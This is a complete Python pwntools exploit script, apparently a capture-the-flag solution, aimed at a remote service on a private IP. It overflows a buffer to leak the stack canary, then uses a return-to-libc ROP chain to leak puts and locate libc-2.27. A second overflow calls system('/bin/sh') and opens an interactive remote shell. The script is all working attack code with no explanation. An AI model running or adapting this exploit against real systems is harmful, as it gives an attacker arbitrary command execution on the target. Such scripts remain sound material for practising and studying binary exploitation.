
from pwn import*
context.log_level = "debug"
 
 
 
 
#io = process("./pwn")
io = remote("10.1.5.252",9998)
elf = ELF("./pwn")
ret_addr = 0x40059e
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
main_addr = 0x400789
pop_rdi_ret = 0x400863
offset = 0x50 - 0x8
payload1 = b"a"*offset

def leak_canary():
  io.sendlineafter("Do you know how to do buffer overflow?\n",b"a"*offset)
  io.recvuntil(b"a"*offset)
  io.recvuntil("\n")
  canary=u64(io.recv(7).rjust(8,b"\x00"))
  print(hex(canary))
  return canary
 #for leak_libc
 
canary = leak_canary()
payload2 = b"A"*(offset) + p64(canary) + p64(1)
payload2 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
io.sendline(payload2)
io.recvuntil("I hope you win\n")
 #leak_libc
puts_addr=u64(io.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
print(hex(puts_addr))
libc = ELF("./libc-2.27.so")
libc_base = puts_addr - libc.sym['puts']
success("libc_base:" + hex(libc_base))
system_addr = libc_base + libc.sym['system']
success("system_addr:" + hex(system_addr))
success("system_offset :" + hex(libc.sym["system"]))
bin_sh = libc_base + libc.search(b'/bin/sh').__next__()
 #attack_pwn
canary = leak_canary()
payload3 = b"A"*offset + p64(canary) + p64(1) + p64(ret_addr)
payload3 += p64(pop_rdi_ret) + p64(bin_sh) + p64(system_addr)
io.sendline(payload3)
io.interactive()
 
 
 
 